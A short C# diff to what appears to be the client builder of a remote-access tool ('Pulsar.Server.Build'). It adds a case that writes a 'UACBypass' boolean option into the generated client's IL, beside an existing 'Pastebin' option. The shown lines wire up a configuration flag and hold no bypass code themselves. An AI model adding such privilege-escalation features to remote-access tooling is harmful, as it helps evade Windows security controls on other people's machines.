@@ -207,6 +207,9 @@ namespace Pulsar.Server.Build
                                         case 10: // Pastebin
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Pastebin));
                                             break;
+                                        case 11: // UACBypass
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UACBypass));
+                                            break;
                                     }
                                     bools++;
                                 }
